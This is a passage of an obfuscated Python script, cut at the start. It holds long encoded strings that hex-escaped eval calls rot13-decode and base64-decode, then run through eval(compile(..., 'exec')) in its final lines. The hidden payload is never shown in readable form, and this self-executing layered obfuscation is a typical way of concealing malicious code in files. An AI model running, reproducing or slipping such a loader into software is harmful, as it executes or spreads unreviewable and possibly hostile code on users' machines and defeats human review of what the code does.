NRNXJkRi9nY1h2c09KVENkTXpzQjVUSG9tWVhrNzBDNXcxMjJENkV2NURybXB5NHZNWXNBbUpMNkljdGRuK0dJNFFWWFlnT3V2VGxVa0RoLzA3cFp3OWlmYktTcFZ6Vk14ZXhvNVZaaTlzSDBObk'
destiny = '02GGyuI0S2nHkmZ1ATHwWIEaSfJRMmZUS2MTMXF29uJIAeDKA5oR85JyMJMUEyIJteZ3MKFSMbq3D0JSI0oKySJSODqKcbX0gHFSu1oayfJH8lAv9PMKEeLJSbIUMGrKIMZHpmpl9gFzZ3rwAzrTuznzEEEmS4nmMiLKqQAQD5L0j2JxL3A3MzH1IeGxkDH3IXFv9hGJETpT5Mo0HipwyDIwOEY2j1FHMTnaOBqQE1AIAlrxpmqJySHQIkF0j2LxL0IT1vq2t5JTV4p3MBFGuyDyu1Z01ILxEGAxMJZSqyL0WUAUqGJyOkF2IPHRgeI2IFpzEbnaqxqTAeISSHGUWPHKSTJx5aGRMOpz9SrRWenwOJBTMwqwS4LHEQFIuVAx9WY1H2MIOiHIMOHSynDGOEGzuWoJyOEKqaHzucGSWQZxyMA1WDHJ1LFHIOD05aGGSYGHMYHxAwZyIeAxyBrRMxn1OMnJEEJzchqxyLM2bmn2LjHJEjEHESFKWeFHyHMQIPD0IbATgOASWVBQEmp0D0Lx5mnaqMAHW2I0uGFzqwJayHp2uSoxAaFayxFxjjn0ScZx5DqxWRrGS0FzcAH0kxoUL2pKE0nGOvEJD4FSE0EztkpauvIHpjnmuUM0x3AKyuDlgmX0WzA3WODF9AqH1zqGScDHV3owELZJgQFHR3FTf5JatlEHk3DJZlAzcyD1SZBHqcpaAFoHEDAauzpKblG25Epaquo2RjX2u3LJ5lnxMLFT1VIGuuBIuJqH5UZQOKryWlAmV0HKATo3qZn1ulIR1CY1IYrKATMzM4BTyQrayjZF9eI3WZIyMeJID4Jxc4MxyPFxAToTgXGUAMqTAxGJuQEwIfZTgEIGuxAzgEL001MRk0HGp4I2EmEJ1UIz03FHcUL1EzIwWbrGEfMISgFxqlEaSeASIUnKuGFIMMHR1bFKqvIKSIqRMSpUHjZ3uVpQuuHaAQnT1IH1IYLGp5qaO0D05bZGRip1EuEUAdJHHiBF9gpwL5FKM2ZRgzHTgbqaMFJwy1ZQSyFRu0GyuAZIL5BIczLxIRDKZ4Z1V5ZII0oKRipaSgFQMOZ0AHHTgJqH0eDaq1FTyVqzLlo0ABpz9BDJImnUc6GHZkM1NkFaMKMPgfE0uaGQOOIQyaEUu4L2uRBSyTrGq2GwEiMSxiDH5Oq056qT1BqRA3ERDmFyy1DHuxqRA3F1WjFF9ZIHWOrGAdEJSBBRMCJSD5JGqyZHujqwOnnwuGBUu1GJ5EI1y6MKqmIQqAHTp2DzjiEQERoJgAAQA5qxE3IHx2MRqIqxgjExgAMJcWF1czE01wDGOMY0ggrKAVozyvGzf5AxMnGQO4ZTIUXmExHQOnY0EeYmuYMmSgEmSxnR9KG0WII0AMIGp0qJMUnT1CEUpjGHEXBTSUMJ9vGzceGmDmpH16nHAjJKO5E1OiGHWWrxgLG1c2GyuAD0RjH3IPJUIIp2IeHP9dHGWCoTHiY3qkMRp2Lv9TqKqiMwAZnxIXnHkRMaMlqwuRryAfZySRBQWGY3clLaqXFaI5G1tjpJ8lL1EUJTkKrJyJLx5HZzW1rJylGKMYXmMKq21XH2MvMSclFQqvn1tlHwMIEmAWF3AZGxqzrQMlXl9wJH1ZFxEzq0MlBJyDHJ5cFGSVFIteDwL1oGExZH5IqJpmGIOaoREVAxMMA3HkMzuKpzAlLH51oRqFMGAxE1ybp3Z4E3AEER1YGwMYY2bjBKHjDGSxA25iFwVjGv9OARD5nGuXBUqwHTqRY2Z4JF9PL00inKAUG1OBGyA4nwuTM2RinzATY3q3ETuDYmA2E0AODz9ZX0E6A0qRpyuIrUt2HGIjGSZ0nyyvX0kjAGWaFUq5o09HoGIkEwyYY1DmGH05DwIWp0j3Fl85HRcmrJ9DnHMDHJR5AzH5nwuRBUpeFwuMFH5coJyWFRZ0ImWPGaO0JScgnwqdrxt0JQAbHT55n1McGRyjLzqLJxEgFyDiHSyMY1IAGGWUpxqVZxuaM0qkJSq5MTyuMaRiGJMaIREPq2qHLvgBDIyXolghBUqyEzAaX3SzrTqIFGWgn3p0MGEupzqYBKWhZREADJWIZwuVI0SjFIH5A1AIA3tiFSb1HGS0rwIwoaSlATkMoSugJR9bpl9YoKA6ZIMKBTu5IIq3FUMTIJclMHM5A2EdY2WGASuCDGSJHKIvGmMKEHuFIyx4MTA5nGIdJwE0ZHL4pxI0nHkbY2g0BR5aHUADnxuOHSycHRR0BHWbAwZiIGARJKuHGGMLDHSJrGWFozZiGzkMFacwZRWGBUylE0peMz03qISfZIE4EULeH01ArzR2qz1aY20eqQIYqlgBHmq1MwIkrJkdHHSLARSBETqvpRSLMH9MAySDnmOeHJAfoxV4M0L3rIOxIJIvoP9TETA3ATcXAQu4FmuVL0keD2WRoUcTH1NkEUbkAxIDF0AxnQIjMHAQHKu2qRAmHHucISbjLmt4DaD3qIEEqwAJERSQq1EMY3IxpaW0ZxE1G25LH3W1JaZmoKc1FR1DqauinJt1LHIBJyuLE1MvpGukZxM0qRyKZyLiqRyfDzcwY29zqUuLY05kLxq4AJ8lHGL3JzMlG2I4rUO4BP9TExE6q0cRp0kLqzWTGT1aozAWBJEyn2MPHwAnLaH3HF9vZmM0pFgjMGWTqJ10q3cyMTReryDmrJL2AH14GwufX1MeX1uJLl9LI0DjFUEdAJL1naqFI2AgEQSdA3uLrHuxA2cHBIRmLJkCI0L5E1OYHT1RZRykHwM6oR9IqwqQMRuYZ1MhMUWYpwOWHRMnA3W4GmR3EypkpKqdIJEBp0ukMzDlLx1zM09OG28eAGAeEwDlY2MJMmx4oTp1GSuyEmqRnwRinTEBpzyzZ0x3oHEyGv8lIv94oJAyoIZiGzWfrJA1Ll93BSuYoayuIxyfGIAMGauloKuQE25dY1S6A3cBGHDjDwLjEGELBGIOnSuPA1c0Ex1dq0t0pKSJEzARoxWGJFgGp0fmI09hETEHX3D1oSt2EH9UFKWVpxMLMyp5rRuZM0WcEUuED1cAFzAunxVlp055GTqXpwAeZTk5LIMDJKSBMGqQqyuTDKcaBJL0BGZeHzkbrv95ImSHGwpmoGADI0t1E1M0Y0RiJwybZxEbqHuUHQAhARcKDycfZUMmBJgEZPgErHA1MUOfHGV2E0gbM1M5EwSQIayRIRq0pGMLD2I1qmyuX2fjLFggpyWmBJMiAyIVrycvImyYMKqzqGt5LGWKD3EzGTcHGRg2GGAhqKEdZwD0G3y6A095oyuKL1NlI2Mnoyp5p3MFMRDiESOvMaShDJEaI3cXrQWzoGq3rR01I1yTnmyTJJ5EY0MmFaETAzSDHyWwE3cCI2x0oGWPGGxkpmZ0pUu3qGSzozZmFHf1o2yYqJuaowITZJZ0HSy2FKyyD1cWpHkHEJMjLKOBrKOMITW1ZvgxqR1JHmugq1EwpJ1EZIICDKqeEUEQMIIMGRAODJH2Jz9eqSywL2EdJRq6Y0SnJySAEzcUJHSLGUI2MHkKrQucX0M2MRjjAIMvEJ9uM3q5ZwHjnwR2ZJyJIzARGJA1Z09wG053p0kkL3MnFTAZp2IynQWurUujAzSiqIbeMJWUZyA0Gmx3JRp3rQqxBSOwEQyMo3cxZJV3HmD1MT14ZvgWZKyuozW6A2IgAHVeEz9DHSyMD09aY1Rkrz9vX3cSqUq2rz5dA1A3M0kBDaAKoyZloQyWMap0GT9YI2cmMGO4DzA3HSEUAPg0rGSfrx1WH0WcGxp2Jyy1ExyErRqdD2RmnQqboFgcGGMlo2cvMxWdER5KHSO1GwqKEQWCM1y3pTcboIteFxuDH3xiLmykJzWYDJgjqSWzY1ynM2AfHIATnSO1oGABo1x5HyOEqJkDnHWjDxSvJH52EH1RIHykIHudBIOnLxyXnwAiA01VJKI2ZxVkIxcGX0uRAl9QDzqWpwqHFIuUIxW4pRqRqRZ5oJ42DyMMASAmZGW0GKSVDxWdFyyzAxDlrzgkGJt5EwIjnacQM1xinSIUEv9YFIEVox5hEUcwAyWAETuVnGMWLwVenKSUrKOmF2MMA1VlL0MEAID0HIxlA3R5Jz03Gz4irKEvHUtmEmEYFxIBpT14qQISoJ5XpmMCX1ywnwOzZ1MaBJ5kL0cnn0uRBTclJySdAJAan0cPAz9XH2qPZxyvIHyBnT9PqRyTn0cOFSyHqxZjFISYDIN2Fzp1LwA6HIx0omuZq2y0MTM3LwOiq0MZBIMeMJyCAUEWpyyLJGIPBHp2FTDeMHyPX2yeElgFnyIKFaMHAKAjpTt1rQWzpP9OZz9zL0y5ZUOUI0SMpH5OqxqMExMFHzE6MIMIZJE1FGOSA3SWAJEQJxEHX2y6EQIAI1qxBGu6n3OHEwNjHzjjnx9GZHcQAIq2nmqdZKD2Gzf4I3A5X0SgAzcYq3N1qGMeBRAfrauZA2qREHkgp3IzHwSdIacJHKuVMGqWqTkwZzf4pSEcrQIwJQuhpJIanRkOqTELn0EhqIMDD0kvZmuzIGWDnR9BoRyfqSWGrSO0Jxc2JGL0ARgPG0W0oxcVFQEUox1gHTkuFTb1BREnG0HiI214oJqQHzt5IQAirTWIpSy3HxH0Fz1uYmMAM2SiY056qUW5IJIZoT0jAmujqRAcGKyvo0L2DIcXIycAX2cUM2jmnxEfnISeMzMgMHkzLacQExgkHR9SGTk5Fx81FIWHMxtiZR9PpUAMFH9UnzLeAR13IaSLqUcAoKAHrHj4ZHEAA1uEJKugFUEDrF84EGA3nJcQBKbmG0t0LxyGrTq3HwARXmuJqxtiHwqRHSOyDIHiAHSnLGEJBJ5iEQqEE0qaGmqUZmWwrQuYoxReMH43Y1xjL2R4LKWmEHuZqT16DwMRZ20eFSOuImMBGzy2FyIhEzb2LxgYMacGpHIGZSV1JFg3AxZ4GmMiHaARGJgyqQZ4n2qmA3yjFTAypmARp0SIoHywEP9zX3SmnJ0jCFpfVR5iozHcYPtaMKuyLlpfVPqsK2ygpT9lqS9sWljtW2kiLJEmWljtW2EyL29gpUWyp3ZaYPNaLwL0MTIwo2EyWljtW0I4L2IjqTyiovpfVPqyWljtW3OlnJ50WljtW3A0pvpcYPtcYPqZLJ1vMTRhpUxaYPp8oJ9xqJkyCvpfZFkvWl5prQNkWljbXFjbXFx7Kltc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
